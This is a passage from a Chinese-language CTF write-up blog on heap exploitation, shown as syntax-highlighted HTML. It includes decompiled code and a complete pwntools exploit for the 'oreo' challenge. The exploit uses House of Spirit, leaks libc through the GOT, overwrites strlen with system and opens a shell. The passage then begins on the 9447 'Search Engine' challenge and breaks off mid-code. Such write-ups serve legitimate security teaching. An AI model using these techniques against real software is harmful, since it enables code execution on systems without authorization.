punctuation">(</span><span class="token string">"%u. Show added rifles\n"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%u. Order selected rifles\n"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%u. Leave a Message with your Order\n"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%u. Show current stats\n"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%u. Exit!\n"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">read_choice</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                  <span class="token comment" spellcheck="true">// malloc(guns) 指针记录在bss段  ，guns数量也记录在bss段，存在溢出</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token function">show_rifle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token comment" spellcheck="true">// 常规输出chunk内容</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 将所有chunk 都free掉 bss指针置零</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token function">order_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 在bss_message上输入最多0x80数据</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token function">show_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v1<span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>其数据结构：<br><img src="https://s1.ax1x.com/2020/10/20/BSNn41.png" alt=""><br>在add函数中name可以最多输入56个字节，所以可以覆盖chunk3的chunk2指针，从而可以free 某个fake_chunk</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>可以发现这个菜单题对chunk是没有edit功能的只能写入一次，那么这里就选择了order_message函数，因为：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">order_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>  v0 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter any notice you'd like to submit with your order: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>bss_ptr_message<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token operator">&lt;&lt;=</span><span class="token operator">==</span><span class="token operator">==</span>  <span class="token function">jie_duan</span><span class="token punctuation">(</span>bss_ptr_message<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>bss_ptr_message是一个bss段上的指针，这指针指向：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A288 <span class="token punctuation">;</span> <span class="token keyword">char</span> <span class="token operator">*</span>chunk<span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A288 chunk           dd <span class="token operator">?</span>                    <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> add<span class="token operator">+</span><span class="token number">11</span>↑r<span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A288                                         <span class="token punctuation">;</span> add<span class="token operator">+</span><span class="token number">25</span>↑w <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A28C                 align 20h<span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A2A0 order_times     dd <span class="token operator">?</span>                    <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> delete<span class="token operator">+</span>5A↑r<span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A2A0                                         <span class="token punctuation">;</span> delete<span class="token operator">+</span><span class="token number">62</span>↑w <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A2A4 guns            dd <span class="token operator">?</span>                    <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> add<span class="token operator">+</span>C5↑r<span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A2A4                                         <span class="token punctuation">;</span> add<span class="token operator">+</span>CD↑w <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A2A8 <span class="token punctuation">;</span> <span class="token keyword">char</span> <span class="token operator">*</span>bss_ptr_message<span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A2A8 bss_ptr_message dd <span class="token operator">?</span>                    <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> order_message<span class="token operator">+</span><span class="token number">23</span>↑r<span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A2A8                                         <span class="token punctuation">;</span> order_message<span class="token operator">+</span>3C↑r <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A2AC                 align 20h<span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A2C0 bss_message     db    <span class="token operator">?</span> <span class="token punctuation">;</span>               <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> main<span class="token operator">+</span><span class="token number">29</span>↑o             <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A2C1                 db    <span class="token operator">?</span> <span class="token punctuation">;</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A2C2                 db    <span class="token operator">?</span> <span class="token punctuation">;</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A2C3                 db    <span class="token operator">?</span> <span class="token punctuation">;</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A2C4                 db    <span class="token operator">?</span> <span class="token punctuation">;</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>0804A2C5                 db    <span class="token operator">?</span> <span class="token punctuation">;</span></code></pre><p>由于每一次add都会使guns加一所以这里可以视为我们可控的size字段，那么这里用到的就是House Of Spirit（HOS），将chunk3的chunk2覆盖为0804A2A8 ：bss_ptr_message，这样guns恰好作为fake_chunk的size字段。还有的要求是：<strong>构造一个常规size，fake_chunk的foot的size字段合理</strong></p><p>如果成功我们就可以释放一个包括bss_ptr_message指针的chunk，通过order_message和show_status功能实现<strong>任意地址读写</strong></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#+++++++++++++++++++oreo.py++++++++++++++++++++</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-                           </span><span class="token comment" spellcheck="true">#Author: Squarer</span><span class="token comment" spellcheck="true">#Time: Sun Oct 18 23:13:31 CST 2020</span><span class="token comment" spellcheck="true">#+++++++++++++++++++oreo.py++++++++++++++++++++</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'i386'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'oreo'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#libc = ELF('null')</span><span class="token comment" spellcheck="true">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>descrip<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>descrip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_rifles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Action: '</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">order_message</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./oreo'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('ip',port)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token string">'padding1'</span><span class="token punctuation">,</span><span class="token string">'padding1'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#for cache for guns</span>name <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">27</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0804A2A8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token string">'attacking'</span><span class="token punctuation">)</span>order_message<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#malloc对fastbin chunk的下一个chunk->size的检查</span><span class="token comment" spellcheck="true">#gdb.attach(sh,'b*0x08048855')</span>delete_all<span class="token punctuation">(</span><span class="token punctuation">)</span>descrip <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'strlen'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">,</span>descrip<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>show_status<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Order Message: '</span><span class="token punctuation">)</span>strlen_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"strlen_addr ===>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>strlen_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_L <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'strlen'</span><span class="token punctuation">,</span>strlen_addr<span class="token punctuation">)</span>libc_L_addr <span class="token operator">=</span> strlen_addr<span class="token operator">-</span>libc_L<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'strlen'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x2000</span>system_L_addr <span class="token operator">=</span> libc_L_addr <span class="token operator">+</span> <span class="token number">0x3adb0</span>   <span class="token keyword">print</span> <span class="token string">"libc_L_addr===>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_L_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"system_L_addr=====>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_L_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> strlen_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'strlen'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x2000</span>   <span class="token keyword">print</span> <span class="token string">"libc_addr ===>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"system_addr====>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh,'b*0x080487EB')</span>order_message<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>system_L_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'||sh'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#这里因为向strlen_got写入system后就立马调用了strlen(a1) 而a1 == 我的order_message()的输入</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>不知道为啥我在本地算出的libc总是和真实的libc地址相差0x2000   ，就算用LibcSearcher也是这样</p><h2 id="2015-9447-CTF-Search-Engine"><a href="#2015-9447-CTF-Search-Engine" class="headerlink" title="2015 9447 CTF : Search Engine"></a>2015 9447 CTF : Search Engine</h2><h3 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h3><pre class=" language-java"><code class="language-java">matrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>how2heap<span class="token operator">/</span>wiki_heap<span class="token operator">/</span>fastbin_attack$ checksec search<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/matrix/PWN/how2heap/wiki_heap/fastbin_attack/search'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span>    FORTIFY<span class="token operator">:</span>  Enabled</code></pre><p>关闭PIE</p><h3 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h3><p>读懂程序想干啥很重要。</p><h4 id="insert函数"><a href="#insert函数" class="headerlink" title="insert函数"></a>insert函数</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_400C00</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbp</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// er13</span>  <span class="token keyword">char</span> <span class="token operator">*</span>chunk<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// r12</span>  <span class="token keyword">signed</span> __int64 top<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>  <span class="token keyword">signed</span> __int64 foot<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbp</span>  _DWORD <span class="token operator">*</span>record<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">int</span> string_nums<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// edx</span>  __int64 saved<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdx</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdx</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter the sentence size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">read_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v0 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size <span class="token operator">=</span> v0<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v1 <span class="token operator">></span> <span class="token number">0xFFFD</span> <span class="token punctuation">)</span>    <span class="token function">puts_exit</span><span class="token punctuation">(</span><span class="token string">"Invalid size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter the sentence:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  chunk <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">selfs_read</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>chunk<span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  top <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>chunk <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  foot <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> __int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>chunk<span class="token punctuation">[</span>v1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  record <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x28uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  string_nums <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>record <span class="token operator">=</span> chunk<span class="token punctuation">;</span>  record<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>record <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> chunk<span class="token punctuation">;</span>  record<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>top <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">32</span> <span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">// 记录chunk中非' ' 字符的个数</span>    <span class="token punctuation">{</span>      record<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">++</span>string_nums<span class="token punctuation">;</span>LABEL_4<span class="token punctuation">:</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>top <span class="token operator">==</span> foot <span class="token punctuation">)</span>        <span class="token keyword">goto</span> LABEL_8<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> string_nums <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v10 <span class="token operator">=</span> bss_record<span class="token punctuation">;</span>      bss_record <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>record<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>record <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> v10<span class="token punctuation">;</span>      record <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x28uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      string_nums <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>record <span class="token operator">=</span> top<span class="token punctuation">;</span>      record<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>record <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> chunk<span class="token punctuation">;</span>      record<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>      <span class="token keyword">goto</span> LABEL_4<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>record <span class="token operator">=</span> top<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> top <span class="token operator">!=</span> foot <span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_8<span class="token punctuation">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> string_nums <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    saved <span class="token operator">=</span> bss_record<span class="token punctuation">;</span>    bss_record <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>record<span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">// 指针记录</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>record <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> saved<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 形成链表</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span>record<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Added sentence"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>结构体：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> record<span class="token punctuation">{</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span> ptr_word <span class="token operator">=</span> word_addr<span class="token punctuation">;</span>    _int64 string_nums<span class="token punctuation">;</span>     <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span> ptr_sent <span class="token operator">=</span> sentence_addr<span class="token punctuation">;</span>    _int64 size<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span> ptr_prev <span class="token operator">=</span> <span class="token operator">&amp;</span>prev_record<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>数据结构：<br><img src="https://s1.ax1x.com/2020/10/20/BSNeE9.png" alt=""></p><h4 id="search函数"><a href="#search函数" class="headerlink" title="search函数"></a>search函数</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sub_400AD0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebp</span>  <span class="token keyword">void</span> <span class="token operator">*</span>chunk<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// r12</span>  __int64 i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>  <span class="token keyword">char</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-38h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter the word size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size <span class="token operator">=</span> <span class="token function">read_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xFFFD</span> <span class="token punctuation">)</span>    <span class="token function">puts_exit</span><span class="token punctuation">(</span><span class="token string">"Invalid size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter the word:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">selfs_read</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>chunk<span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// 0====>不会进行\n替换为\x00</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> bss_record<span class="token punctuation">;</span> i<span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token 